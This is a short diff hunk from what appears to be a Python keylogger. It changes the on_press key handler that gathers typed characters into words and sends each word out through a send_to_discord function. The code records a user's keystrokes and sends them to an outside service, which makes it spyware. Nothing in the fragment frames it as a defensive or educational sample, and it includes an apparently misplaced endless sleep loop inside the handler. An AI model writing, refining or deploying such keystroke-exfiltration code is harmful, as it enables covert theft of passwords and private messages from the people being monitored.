@@ -24,11 +24,11 @@ def on_press(key):
     if key_pressed != " ":
         current_word.append(key_pressed)
 
-    if key_pressed == " " or key_pressed == "\n" or key_pressed == "":
+    if key_pressed == " " or key_pressed == "\n":
         if len(current_word) > 1:
             send_to_discord(' '.join(current_word))
         current_word = []
-
+        
     while True:
         time.sleep(1)
 
